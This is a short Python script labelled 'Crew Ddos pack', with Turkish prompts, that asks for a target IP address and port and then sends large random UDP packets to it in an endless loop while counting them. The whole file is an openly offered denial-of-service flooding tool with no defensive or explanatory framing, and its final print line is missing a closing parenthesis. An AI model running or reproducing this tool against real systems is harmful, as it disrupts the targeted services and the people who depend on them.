import socket
import random
import os
import colorama
from colorama import Fore, Back, Style, init
os.system("clear")
banner="""
  Crew Ddos pack
"""
print(Fore.GREEN + banner)

hedef_ip=raw_input(Fore.RED + "hedef ip: ")
hedef_port=input(Fore.RED + "hedef port: ")

bytes=random._urandom(10000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac=0
while True:
    sock.sendto(bytes,(hedef_ip,hedef_port))
    sayac=sayac+1
    print(Fore.GREEN  + "saldiri baslatildi, gonderilen saldırı paketi:%s"%(sayac)
